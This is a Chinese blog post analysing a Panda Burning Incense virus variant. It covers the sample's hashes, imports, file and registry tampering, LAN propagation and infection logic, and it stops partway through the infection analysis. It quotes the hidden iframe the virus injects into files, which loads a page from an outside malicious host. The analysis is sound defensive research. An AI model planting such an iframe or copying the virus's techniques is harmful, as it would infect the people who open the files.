@@ -1,0 +1,262 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="熊猫烧香变种病毒分析"><meta name="keywords" content="病毒"><meta name="author" content="yusakul,undefined"><meta name="copyright" content="yusakul"><title>熊猫烧香变种病毒分析 | 梁言</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css?version=1.5.5"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  localSearch: undefined
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1．样本概况"><span class="toc-number">1.</span> <span class="toc-text">1．样本概况</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-样本信息"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 样本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-病毒行为"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 病毒行为</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-测试环境及工具"><span class="toc-number">1.3.</span> <span class="toc-text">1.2 测试环境及工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-分析目标"><span class="toc-number">1.4.</span> <span class="toc-text">1.3 分析目标</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-1-查看PE文件"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.3.1 查看PE文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-kernel32-dll文件导入函数"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">1. kernel32.dll文件导入函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Advapi32-dll"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">2. Advapi32.dll</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Mpr-dll"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">3. Mpr.dll</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-2-火绒剑监控-文件操作"><span class="toc-number">1.4.2.</span> <span class="toc-text">1.3.2 火绒剑监控 - 文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-创建自我备份在根目录"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">1. 创建自我备份在根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-创建并释放隐藏文件Desktop-ini"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">2. 创建并释放隐藏文件Desktop_.ini</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-自我复制"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">3. 自我复制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-2火绒剑监控-注册表操作"><span class="toc-number">1.4.3.</span> <span class="toc-text">1.3.2火绒剑监控 - 注册表操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-无效“显示所有文件和文件夹”功能"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">1. 无效“显示所有文件和文件夹”功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-删除杀毒软件自启项"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">2. 删除杀毒软件自启项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-修改文件"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">3. 修改文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-3-火绒剑监控-网络操作"><span class="toc-number">1.4.4.</span> <span class="toc-text">1.3.3 火绒剑监控 - 网络操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-扫描并尝试连接局域网脑内139、445端口"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">1. 扫描并尝试连接局域网脑内139、445端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-尝试连接外网IP，并发送数据包"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">2. 尝试连接外网IP，并发送数据包</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-4火绒剑监控-进程操作"><span class="toc-number">1.4.5.</span> <span class="toc-text">1.3.4火绒剑监控 - 进程操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-遍历系统进程并启动自释放文件"><span class="toc-number">1.4.5.1.</span> <span class="toc-text">1. 遍历系统进程并启动自释放文件</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2．具体行为分析"><span class="toc-number">2.</span> <span class="toc-text">2．具体行为分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-主要行为"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 主要行为</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-恶意程序对用户造成的危害"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 恶意程序对用户造成的危害</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-替换程序图标"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">1. 替换程序图标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-隐藏文件"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">2. 隐藏文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-有目录创建Desktop-ini文件，内容为当前时间（2018-7-11）。"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">3. 有目录创建Desktop_.ini文件，内容为当前时间（2018-7-11）。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-恶意代码分析"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 恶意代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-恶意代码树结构图"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 恶意代码树结构图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-恶意代码IDA结构图"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.1 恶意代码IDA结构图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-主要功能函数sub-40819C-–-复制"><span class="toc-number">2.2.3.</span> <span class="toc-text">2.2.2 主要功能函数sub_40819C – 复制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1．查找系统目录下是否存在Desktop-ini文件-有则删除"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">1．查找系统目录下是否存在Desktop.ini文件,有则删除</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2．检测病毒spc0lsv-exe"><span class="toc-number">2.2.3.2.</span> <span class="toc-text">2．检测病毒spc0lsv.exe</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-3-主要功能函数sub-40D18C-–-感染"><span class="toc-number">2.2.4.</span> <span class="toc-text">2.2.3 主要功能函数sub_40D18C – 感染</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#感染文件线程"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">感染文件线程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-自我复制-时钟周期6s"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">2. 自我复制 - 时钟周期6s</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-局域网传播"><span class="toc-number">2.2.4.3.</span> <span class="toc-text">3. 局域网传播</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-4-主要功能函数sub-40D088-–-其他"><span class="toc-number">2.2.5.</span> <span class="toc-text">2.2.4 主要功能函数sub_40D088 – 其他</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TimerFunc-1（1s）"><span class="toc-number">2.2.5.1.</span> <span class="toc-text">TimerFunc_1（1s）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TimerFunc-2（1200s）"><span class="toc-number">2.2.5.2.</span> <span class="toc-text">TimerFunc_2（1200s）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TimerFunc-3（10s）"><span class="toc-number">2.2.5.3.</span> <span class="toc-text">TimerFunc_3（10s）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-TimerFunc-4（6s）"><span class="toc-number">2.2.5.4.</span> <span class="toc-text">4. TimerFunc_4（6s）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TimerFunc-5（10s）"><span class="toc-number">2.2.5.5.</span> <span class="toc-text">TimerFunc_5（10s）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TimerFunc-6（180s）"><span class="toc-number">2.2.5.6.</span> <span class="toc-text">TimerFunc_6（180s）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3．解决方案"><span class="toc-number">3.</span> <span class="toc-text">3．解决方案</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-病毒行为"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 病毒行为</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-杀毒工具编写步骤"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 杀毒工具编写步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-1-终止病毒进程"><span class="toc-number">3.2.1.</span> <span class="toc-text">3.2.1 终止病毒进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-2-删除文件"><span class="toc-number">3.2.2.</span> <span class="toc-text">3.2.2. 删除文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-3-修复注册表，删除启动启动项"><span class="toc-number">3.2.3.</span> <span class="toc-text">3.2.3 修复注册表，删除启动启动项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-3-查杀工具链接"><span class="toc-number">3.2.4.</span> <span class="toc-text">3.2.3 查杀工具链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-4-工具截图"><span class="toc-number">3.2.5.</span> <span class="toc-text">3.2.4 工具截图</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">yusakul</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">9</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">5</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">1</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container" style="background-image: url(true)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">梁言</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="post-info"><div id="post-title">熊猫烧香变种病毒分析</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-07-13</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p><strong>分析报告</strong></p>
+<table>
+<thead>
+<tr>
+<th>样本名</th>
+<th>2_dump_SCY.exe（熊猫烧香）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>作者</td>
+<td>yusakul</td>
+</tr>
+<tr>
+<td>时间</td>
+<td>2018-07-13</td>
+</tr>
+<tr>
+<td>平台</td>
+<td>Win7-32</td>
+</tr>
+</tbody>
+</table>
+<h1 id="1．样本概况"><a href="#1．样本概况" class="headerlink" title="1．样本概况"></a>1．样本概况</h1><h2 id="1-1-样本信息"><a href="#1-1-样本信息" class="headerlink" title="1.1 样本信息"></a>1.1 样本信息</h2><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /c3fb4c317a40a8062443dc49f7b15f0a.jpg" alt="C:\\Users\\Administrator\\Desktop\\QQ截图20180712090002.jpg"></p>
+<table>
+<thead>
+<tr>
+<th>病毒名称</th>
+<th>2_dump_SCY.exe</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>所属家族</td>
+<td>熊猫烧香</td>
+</tr>
+<tr>
+<td>样本名称</td>
+<td>0c15096fb3bc30800f7af002c25953162b799391300a62b8507fe8e4f6532768</td>
+</tr>
+<tr>
+<td>样本类型</td>
+<td>MS-DOS executable</td>
+</tr>
+<tr>
+<td>样本大小</td>
+<td>98816 bytes</td>
+</tr>
+<tr>
+<td>MD5值</td>
+<td>b8f8e75c9e77743a61bbea9ccbcffd5d</td>
+</tr>
+<tr>
+<td>SHA1值</td>
+<td>188fc8fc580c0ea4bf8a8900a3d36471823c8923</td>
+</tr>
+<tr>
+<td>CRC32</td>
+<td>E63D45D3</td>
+</tr>
+<tr>
+<td>SHA256</td>
+<td>0c15096fb3bc30800f7af002c25953162b799391300a62b8507fe8e4f6532768</td>
+</tr>
+<tr>
+<td>SSDeep</td>
+<td>3072:apAja0pSLwYqK6hVZ7N4bdq4a53YKCOTpc:a2ja0pShqK65ZOq4QYK1m</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1-2-病毒行为"><a href="#1-2-病毒行为" class="headerlink" title="1.2 病毒行为"></a>1.2 病毒行为</h2><table>
+<thead>
+<tr>
+<th>设置注册表实现自启动</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>修改资源管理器（explorer）的文件夹的隐藏属性</td>
+</tr>
+<tr>
+<td>将进程的内存属性修改为可执行或可写</td>
+</tr>
+<tr>
+<td>想系统服务发送控制码</td>
+</tr>
+<tr>
+<td>删除服务</td>
+</tr>
+<tr>
+<td>对指定运行的进程感兴趣</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1-2-测试环境及工具"><a href="#1-2-测试环境及工具" class="headerlink" title="1.2 测试环境及工具"></a>1.2 测试环境及工具</h2><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>VMware® Workstation 14 Pro</td>
+<td>分析环境win7_x32</td>
+</tr>
+<tr>
+<td>火绒剑</td>
+<td>行为监控</td>
+</tr>
+<tr>
+<td>IDA pro 7.0</td>
+<td>静态分析</td>
+</tr>
+<tr>
+<td>Ollydbg</td>
+<td>动态分析</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1-3-分析目标"><a href="#1-3-分析目标" class="headerlink" title="1.3 分析目标"></a>1.3 分析目标</h2><h3 id="1-3-1-查看PE文件"><a href="#1-3-1-查看PE文件" class="headerlink" title="1.3.1 查看PE文件"></a>1.3.1 查看PE文件</h3><h4 id="1-kernel32-dll文件导入函数"><a href="#1-kernel32-dll文件导入函数" class="headerlink" title="1. kernel32.dll文件导入函数"></a>1. kernel32.dll文件导入函数</h4><p>可以看出导入的这些函数都是进程、文件相关的API函数。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /32fec0827b22ff902bb41f8e97814d1d.png" alt=""></p>
+<h4 id="2-Advapi32-dll"><a href="#2-Advapi32-dll" class="headerlink" title="2. Advapi32.dll"></a>2. Advapi32.dll</h4><p>Advapi32.dll是一个高级API应用程序接口。包括了函数与对象的安全性，注册表的操控以及事件日志相关的API函数。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /d2c128a6bac35193ae1ff61a05c9eca0.png" alt=""></p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /e3e71d98c37486de9cc657fc012ac6fe.png" alt=""></p>
+<p>这些函数主要包括三类：注册表相关函数，进程权限修改函数，服务相关函数。</p>
+<h4 id="3-Mpr-dll"><a href="#3-Mpr-dll" class="headerlink" title="3. Mpr.dll"></a>3. Mpr.dll</h4><p>Mpr.dll是windows操作系统网络通信相关模块。</p>
+<p>Wsock.dll windows socket相关API接口。</p>
+<p>WNetAddConnection2A创建一个网络资源的链接。</p>
+<p>URLDownloadToFileA从指定的URL读取内容写入到文件中。</p>
+<p>由上述的导入表分析可知，该病毒程序的主要功能包括：文件读写、注册表修改、进程权限修改，网络链接，URL等。</p>
+<h3 id="1-3-2-火绒剑监控-文件操作"><a href="#1-3-2-火绒剑监控-文件操作" class="headerlink" title="1.3.2 火绒剑监控 - 文件操作"></a>1.3.2 火绒剑监控 - 文件操作</h3><h4 id="1-创建自我备份在根目录"><a href="#1-创建自我备份在根目录" class="headerlink" title="1. 创建自我备份在根目录"></a>1. 创建自我备份在根目录</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /302228cdeedc8de74ba0d2b3d3e4ebc6.png" alt=""></p>
+<h4 id="2-创建并释放隐藏文件Desktop-ini"><a href="#2-创建并释放隐藏文件Desktop-ini" class="headerlink" title="2. 创建并释放隐藏文件Desktop_.ini"></a>2. 创建并释放隐藏文件Desktop_.ini</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /96a3536631e4fa45bae76a71fec119d4.jpg" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\QQ截图20180712092520.jpg"></p>
+<h4 id="3-自我复制"><a href="#3-自我复制" class="headerlink" title="3. 自我复制"></a>3. 自我复制</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /ba3981aea629d399ccd32cffed93b2f7.jpg" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\QQ截图20180712093142.jpg"></p>
+<h3 id="1-3-2火绒剑监控-注册表操作"><a href="#1-3-2火绒剑监控-注册表操作" class="headerlink" title="1.3.2火绒剑监控 - 注册表操作"></a>1.3.2火绒剑监控 - 注册表操作</h3><h4 id="1-无效“显示所有文件和文件夹”功能"><a href="#1-无效“显示所有文件和文件夹”功能" class="headerlink" title="1. 无效“显示所有文件和文件夹”功能"></a>1. 无效“显示所有文件和文件夹”功能</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /d00ae1aaf8673d6387de94124da2095c.png" alt=""></p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /f0cf4645ac92aeb1867f1dff8d545272.png" alt=""></p>
+<h4 id="2-删除杀毒软件自启项"><a href="#2-删除杀毒软件自启项" class="headerlink" title="2. 删除杀毒软件自启项"></a>2. 删除杀毒软件自启项</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /95a589d93989dafe93e4985f82e0b4ce.jpg" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\QQ截图20180712094335.jpg"></p>
+<h4 id="3-修改文件"><a href="#3-修改文件" class="headerlink" title="3. 修改文件"></a>3. 修改文件</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /ac9c2537ab2e5a6e5f4fcf8543e31b65.png" alt=""></p>
+<p>使用notepad++查看被修改的文件，被新添加了一行：</p>
+<p>\&lt;iframe src=<a href="http://www.ac86.cn/66/index.htm" target="_blank" rel="noopener">http://www.ac86.cn/66/index.htm</a> width=”0” height=”0”>\&lt;/iframe></p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /829658114f5e0f158a5b9fda2a113a7f.png" alt=""></p>
+<p>将该网址提交微步在线分析如下</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /0c2b1fb9d4e0aae3b991616facaf7ff6.png" alt=""></p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /d44278155251e13d367b389538fc365a.png" alt=""></p>
+<h3 id="1-3-3-火绒剑监控-网络操作"><a href="#1-3-3-火绒剑监控-网络操作" class="headerlink" title="1.3.3 火绒剑监控 - 网络操作"></a>1.3.3 火绒剑监控 - 网络操作</h3><h4 id="1-扫描并尝试连接局域网脑内139、445端口"><a href="#1-扫描并尝试连接局域网脑内139、445端口" class="headerlink" title="1. 扫描并尝试连接局域网脑内139、445端口"></a>1. 扫描并尝试连接局域网脑内139、445端口</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /a273c3e984ef8a9d9ea5701518b6a018.png" alt=""></p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /7144b04800cd163dfc1c72c9abcd2699.png" alt=""></p>
+<p>因为本次分析是在虚拟机封闭分析，所以没有连接其他主机，猜测此病毒连接成功后，会向其他主机发送自己，达到传播目的。</p>
+<h4 id="2-尝试连接外网IP，并发送数据包"><a href="#2-尝试连接外网IP，并发送数据包" class="headerlink" title="2. 尝试连接外网IP，并发送数据包"></a>2. 尝试连接外网IP，并发送数据包</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /38b49755c7da905f6d82faa41d26a420.png" alt=""></p>
+<blockquote>
+<p>  数据内容如下：</p>
+</blockquote>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /8fb4ece32a14fad91338706d3dbc4cc2.png" alt=""></p>
+<h3 id="1-3-4火绒剑监控-进程操作"><a href="#1-3-4火绒剑监控-进程操作" class="headerlink" title="1.3.4火绒剑监控 - 进程操作"></a>1.3.4火绒剑监控 - 进程操作</h3><h4 id="1-遍历系统进程并启动自释放文件"><a href="#1-遍历系统进程并启动自释放文件" class="headerlink" title="1. 遍历系统进程并启动自释放文件"></a>1. 遍历系统进程并启动自释放文件</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /5f64118a536c248dc32362d87acdf52f.png" alt=""></p>
+<h1 id="2．具体行为分析"><a href="#2．具体行为分析" class="headerlink" title="2．具体行为分析"></a>2．具体行为分析</h1><h2 id="2-1-主要行为"><a href="#2-1-主要行为" class="headerlink" title="2.1 主要行为"></a>2.1 主要行为</h2><h3 id="2-1-1-恶意程序对用户造成的危害"><a href="#2-1-1-恶意程序对用户造成的危害" class="headerlink" title="2.1.1 恶意程序对用户造成的危害"></a>2.1.1 恶意程序对用户造成的危害</h3><h4 id="1-替换程序图标"><a href="#1-替换程序图标" class="headerlink" title="1. 替换程序图标"></a>1. 替换程序图标</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /12178388601a22bc8e4689ddb2857803.png" alt=""></p>
+<h4 id="2-隐藏文件"><a href="#2-隐藏文件" class="headerlink" title="2. 隐藏文件"></a>2. 隐藏文件</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /50e01c1a978379f728cb6c99c1858a78.jpg" alt="C:\\Users\\Administrator\\Desktop\\QQ截图20180711203912.jpg"></p>
+<h4 id="3-有目录创建Desktop-ini文件，内容为当前时间（2018-7-11）。"><a href="#3-有目录创建Desktop-ini文件，内容为当前时间（2018-7-11）。" class="headerlink" title="3. 有目录创建Desktop_.ini文件，内容为当前时间（2018-7-11）。"></a>3. 有目录创建Desktop_.ini文件，内容为当前时间（2018-7-11）。</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /05278e7db91ed20586ed62a1c7a93bc0.jpg" alt="C:\\Users\\Administrator\\Desktop\\QQ截图20180711205042.jpg"></p>
+<ol start="4">
+<li>大量用户软件被修改，无法正常运行</li>
+</ol>
+<h2 id="2-2-恶意代码分析"><a href="#2-2-恶意代码分析" class="headerlink" title="2.2 恶意代码分析"></a>2.2 恶意代码分析</h2><h3 id="2-2-1-恶意代码树结构图"><a href="#2-2-1-恶意代码树结构图" class="headerlink" title="2.2.1 恶意代码树结构图"></a>2.2.1 恶意代码树结构图</h3><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /9cfd0fe2f952f728e0a73b00420731f0.png" alt="C:\\Users\\Administrator\\Desktop\\2018-07-11_103310.png"></p>
+<h3 id="2-2-1-恶意代码IDA结构图"><a href="#2-2-1-恶意代码IDA结构图" class="headerlink" title="2.2.1 恶意代码IDA结构图"></a>2.2.1 恶意代码IDA结构图</h3><p>两次对比字符串是否相等，不相等则退出, 验证完成后有三个主要的恶意行为函数</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /dc79e79dc6e31dac407c206e21a8d4bf.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_150603.png"></p>
+<h3 id="2-2-2-主要功能函数sub-40819C-–-复制"><a href="#2-2-2-主要功能函数sub-40819C-–-复制" class="headerlink" title="2.2.2 主要功能函数sub_40819C – 复制"></a>2.2.2 主要功能函数sub_40819C – 复制</h3><p>此函数主要功能为自我复制到系统目录并执行复制体。</p>
+<h4 id="1．查找系统目录下是否存在Desktop-ini文件-有则删除"><a href="#1．查找系统目录下是否存在Desktop-ini文件-有则删除" class="headerlink" title="1．查找系统目录下是否存在Desktop.ini文件,有则删除"></a>1．查找系统目录下是否存在Desktop.ini文件,有则删除</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /a9c00aab4f60cd78f5336e490f411b53.png" alt=""></p>
+<h4 id="2．检测病毒spc0lsv-exe"><a href="#2．检测病毒spc0lsv-exe" class="headerlink" title="2．检测病毒spc0lsv.exe"></a>2．检测病毒spc0lsv.exe</h4><p>病毒会通过检查文件路径、病毒感染标志来确定进当前病毒属于以下三种情况的哪一种情况。</p>
+<p>分别进程本身属于原始病毒文件、被感染的可执行文件、以及伪装目标进程三种情况。</p>
+<p>（1）原始病毒文件</p>
+<p>拷贝自身到<br>~/system32/driver/目录，重命名为spc0lsv.exe并运行，然后结束当前进程。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /4e77f5b59b9d1fd7eca55471b7d4018f.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_153943.png"></p>
+<p>（2）当前程序时是被感染的可执行文件</p>
+<p>1）在当前目录释放被感染的原始文件</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /e167ef6ab2353746fd91839525e99c60.png" alt=""></p>
+<p>2）删除系统目录下spo0lav</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /a1d5722069abd9d1996f058e04608848.png" alt=""></p>
+<p>3）将创建病毒程序拷贝到系统目录，并执行。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /03ed98bf41f9b22cb7f64b185d7fdd5d.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_164713.png"></p>
+<p>（3）当前运行路径为系统根目录，说明当前是在伪装成系统程序状态下运行的，没有敏感操作。</p>
+<h3 id="2-2-3-主要功能函数sub-40D18C-–-感染"><a href="#2-2-3-主要功能函数sub-40D18C-–-感染" class="headerlink" title="2.2.3 主要功能函数sub_40D18C – 感染"></a>2.2.3 主要功能函数sub_40D18C – 感染</h3><p>此函数为感染传播函数。</p>
+<p>该函数由3个主要函数，第一个执行感染功能，第二个实现自我复制，第三个局域网传播自身。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /de8e65ccc1e4b38a70770ee5738b2cbc.png" alt=""></p>
+<h4 id="感染文件线程"><a href="#感染文件线程" class="headerlink" title="感染文件线程"></a>感染文件线程</h4><p>（1）遍历文件夹，判断是否为文件夹，判断目录下是否存在Desktop_.ini文件。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /0b6a0697fa3b9220fa54e9acd374cce5.png" alt=""></p>
+<p>判断是否存在Desktop_.ini</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /43d44acfe67224e8ea633c8218b50f52.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_190048.png"></p>
+<p>（2）若目录下存在Desktop_.ini，获取当前系统时间，对比Desktop_.ini中的时间，是同一天则表示此目录已被感染，跳过此目录。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /faad17a72330f7ce494d9bb01229d974.png" alt=""></p>
+<p>若不同则在此目录下生成新的Desktop_.ini，写入本地时间。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /93ce42aca0f334fb486b53c1552cab24.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_191238.png"></p>
+<p>（3）删除GHO备份</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /fc32fab8c108ce7c50086ee0d42a274f.png" alt=""></p>
